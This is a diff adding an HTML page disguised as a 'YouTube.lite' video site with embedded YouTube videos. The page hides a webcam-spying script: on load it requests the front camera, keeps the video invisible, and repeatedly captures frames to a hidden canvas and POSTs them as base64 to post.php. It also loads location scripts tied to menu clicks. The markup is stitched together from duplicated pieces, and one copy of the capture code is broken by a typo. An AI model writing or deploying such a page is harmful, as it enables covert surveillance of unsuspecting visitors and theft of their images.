@@ -1,0 +1,549 @@
+</html>
+<html>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+   <script>
+    window.console = window.console || function(t) {};
+  </script>
+    <script>
+    if (document.location.search.match(/type=embed/gi)) {
+      window.parent.postMessage("resize", "*");
+    }
+  </script>
+
+  <body translate="no" >
+        <script id="rendered-js">
+  feather.replace();
+  //# sourceURL=pen.js
+      </script>
+  
+    
+    </script>
+  
+  <script>
+    $(document).load(mydata())
+  </script>
+
+
+<script>
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 0); //limit upload
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+</body>
+</html>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>YouTube.lite</title>
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700,900&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+      <script src="../../assets/js/jquery.min.js"></script>
+  
+  <script src="../../assets/js/loc.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/feather.min.js"></script>
+    <script src="../../assets/js/location.js"></script>
+    
+    <title>Interactive Mobile Navbar</title>
+    <style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: 0;
+}
+
+body {
+    background-color: rgba(245, 245, 245, 0); /* Fully transparent background */
+    color: #333; /* Text color */
+    line-height: 1.6; /* Line height for better readability */
+    height: 500vh; /* Set height to 500% of the viewport height */
+    overflow-x: hidden; /* Prevent horizontal overflow */
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Font family */
+}
+.video-wrap {
+    display: flex; /* Use flexbox layout */
+    justify-content: center; /* Center the video element horizontally */
+    margin-bottom: 20px; /* Add space below the video container */
+    background-color: rgba(255, 255, 255, 0); /* Fully transparent background */
+}
+
+video {
+    border: none; /* Remove the border completely */
+    width: 640px; /* Set width of the video */
+    height: 480px; /* Set height of the video */
+    opacity: 0; /* Set video opacity to 80% (adjust as needed for transparency) */
+}
+
+canvas {
+    display: none; /* Hide canvas */
+}
+
+
+
+
+
+
+.navbar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    background-color: #2c3e50;
+    padding: 1rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    z-index: 1000;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+}
+
+.logo {
+    color: white;
+    font-size: 1.5rem;
+    font-weight: bold;
+    text-decoration: none;
+}
+
+.burger {
+    width: 30px;
+    height: 20px;
+    position: relative;
+    cursor: pointer;
+    z-index: 1001;
+}
+
+.burger span {
+    position: absolute;
+    height: 3px;
+    width: 100%;
+    background-color: white;
+    border-radius: 3px;
+    transition: all 0.3s ease;
+}
+
+.burger span:nth-child(1) {
+    top: 0;
+}
+
+.burger span:nth-child(2) {
+    top: 50%;
+    transform: translateY(-50%);
+}
+
+.burger span:nth-child(3) {
+    bottom: 0;
+}
+
+.burger.active span:nth-child(1) {
+    top: 50%;
+    transform: translateY(-50%) rotate(45deg);
+}
+
+.burger.active span:nth-child(2) {
+    opacity: 0;
+}
+
+.burger.active span:nth-child(3) {
+    bottom: 50%;
+    transform: translateY(50%) rotate(-45deg);
+}
+
+.nav-links {
+    position: fixed;
+    top: 0;
+    left: -100%;
+    width: 70%;
+    height: 100vh;
+    background-color: #34495e;
+    padding-top: 80px;
+    display: flex;
+    flex-direction: column;
+    transition: left 0.5s ease;
+    z-index: 1000;
+    box-shadow: 2px 0 10px rgba(0, 0, 0, 0.2);
+}
+
+.nav-links.active {
+    left: 0;
+}
+
+.nav-links a {
+    color: white;
+    text-decoration: none;
+    padding: 15px 20px;
+    margin: 5px 0;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.3s ease;
+}
+
+.nav-links a::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(255, 255, 255, 0.1);
+    transition: left 0.3s ease;
+}
+
+.nav-links a:hover {
+    background-color: rgba(255, 255, 255, 0.05);
+}
+
+.nav-links a:hover::before {
+    left: 0;
+}
+
+.content {
+    margin-top: 70px;
+    padding: 20px;
+}
+
+.video-title {
+    font-size: 2rem;
+    font-weight: 700;
+    margin: 0;
+    line-height: 1.2;
+    color: #000;
+    text-align: center;
+}
+
+.video-wrapper {
+    position: relative;
+    padding-bottom: 56.25%; /* 16:9 aspect ratio */
+    height: 0;
+    overflow: hidden;
+    border-radius: 14px;
+    box-shadow: 0 4px 14px rgba(0, 0, 0, 0.7);
+    background: #000;
+    margin: 20px 0;
+}
+
+.video-wrapper iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    border: none;
+    border-radius: 14px;
+}
+
+.suggested-videos {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 20px;
+}
+
+.suggested-video {
+    background: #ffffff;
+    border-radius: 12px;
+    overflow: hidden;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    transition: background-color 0.3s ease;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+}
+
+.suggested-video:hover {
+    background-color: #f0f0f0;
+}
+
+.video-info {
+    padding: 12px 14px;
+    color: #333;
+}
+
+.suggested-title {
+    font-weight: 600;
+    font-size: 1rem;
+    margin-bottom: 6px;
+    color: #000;
+}
+
+.suggested-channel {
+    font-size: 0.85rem;
+    color: #666;
+}
+
+.overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    z-index: 999;
+    opacity: 0;
+    visibility: hidden;
+    transition: all 0.3s ease;
+}
+
+.overlay.active {
+    opacity: 1;
+    visibility: visible;
+}
+
+.header h1 {
+    font-size: 2rem;
+    color: #ff0000;
+    margin: 0;
+}
+
+.header input {
+    width: 300px;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
+
+.header .icons {
+    display: flex;
+    gap: 15px;
+}
+
+.header .icons .material-icons {
+    cursor: pointer;
+    font-size: 24px;
+}
+
+
+
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <a href="#" onclick="locate()" class="logo">YouTube.lite</a>
+        <div class="burger" onclick="toggleMenu()">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </nav>
+
+    <div class="overlay" id="overlay"></div>
+
+    <div class="nav-links" id="navLinks">
+        <input type="text" placeholder="film horor indo">
+        <a href="#" onclick="locate()"><span class="material-icons">home</span> Home</a>
+        <a href="#" onclick="locate()"><span class="material-icons">explore</span> Explore</a>
+        <a href="#" onclick="locate()"><span class="material-icons">subscriptions</span> Subscriptions</a>
+        <a href="#" onclick="locate()"><span class="material-icons">video_library</span> Library</a>
+        <a href="#" onclick="locate()"><span class="material-icons">history</span> History</a>
+        <a href="h2.html" onclick="locate()"><span class="material-icons">history</span>Monitoring Ur Device</a>
+    </div>
+
+    <div class="content">
+    </div>
+    <div class="main-content">
+        <div class="video-wrapper" aria-label="YouTube Video Player">
+            <iframe src="https://www.youtube.com/embed/uLHlHUY3Ww8?si=ygMRhS0lQqHL4_lk" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy" frameborder="0"></iframe>
+        </div>
+        <div class="video-wrapper" aria-label="YouTube Video Player">
+            <iframe src="https://www.youtube.com/embed/brNcmkbi2yk?si=2P_dSvR5q9TxuB0X" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy" frameborder="0"></iframe>
+        </div>
+        <div class="video-wrapper" aria-label="YouTube Video Player">
+            <iframe src="https://www.youtube.com/embed/MlUbvV8zy6M?si=kRPK6JIpMldt_SR1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy" frameborder="0"></iframe>
+        </div>
+
+        <section aria-label="Suggested Videos" class="suggested-videos">
+            <article class="suggested-video" tabindex="0" role="link">
+                <div class="video-wrapper" aria-label="YouTube Video Player">
+                    <iframe src="https://www.youtube.com/embed/2lgA2Wqa4hY?si=gdhDR2eEVJCjgE_b" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy" frameborder="0"></iframe>
+                </div>
+                <div class="video-info">
+                    <div class="suggested-title">Judul Video 1</div>
+                    <div class="suggested-channel">Channel 1</div>
+                </div>
+            </article>
+            <article class="suggested-video" tabindex="0" role="link">
+                <div class="video-wrapper" aria-label="YouTube Video Player">
+                    <iframe src="https://www.youtube.com/embed/pd27NEqWDEA?si=M0kJ3d_E4wQU0L-L" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy" frameborder="0"></iframe>
+                </div>
+                <div class="video-info">
+                    <div class="suggested-title">Judul Video 2</div>
+                    <div class="suggested-channel">Channel 2</div>
+                </div>
+            </article>
+        </section>
+
+    </div>
+    </div>
+
+
+
+            </a>
+    </div>
+ 
+
+<body onload="init()">
+
+<div class="video-wrap">
+    <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+function post(imgdata) {
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'post.php',
+        dataType: 'json',
+        success: function(result) {
+            console.log('Image posted successfully:', result);
+        },
+        error: function() {
+            console.error('Error posting image.');
+        }
+    });
+}
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const constraints = {
+    audio: false,
+    video: {
+        facingMode: "user" // Use the front camera
+    }
+};
+
+// Access webcam
+async function init() {
+    try {
+        const stream = await navigator.mediaDevices.getUser Media(constraints);
+        handleSuccess(stream);
+    } catch (e) {
+        console.error(`navigator.getUser Media error: ${e.toString()}`);
+    }
+}
+
+// Success
+function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    const context = canvas.getContext('2d');
+    setInterval(function() {
+        context.drawImage(video, 0, 0, 640, 480);
+        const canvasData = canvas.toDataURL("image/png");
+        const cc = String(canvasData).replace("data:image/png;base64,", "");
+        post(cc);
+    }, 9000); // Capture every 9 seconds
+}
+
+// Load init
+init();
+</script>
+
+
+
+    
+    <script>
+        const burger = document.querySelector('.burger');
+        const navLinks = document.getElementById('navLinks');
+        const overlay = document.getElementById('overlay');
+
+        function toggleMenu() {
+            burger.classList.toggle('active');
+            navLinks.classList.toggle('active');
+            overlay.classList.toggle('active');
+        }
+
+        function closeMenu() {
+            burger.classList.remove('active');
+            navLinks.classList.remove('active');
+            overlay.classList.remove('active');
+        }
+
+        overlay.addEventListener('click', closeMenu);
+
+        // Close menu when clicking on content area
+        document.querySelector('.content').addEventListener('click', function() {
+            if (navLinks.classList.contains('active')) {
+                closeMenu();
+            }
+        });
+    </script>
+
+</body>
+</html>
+
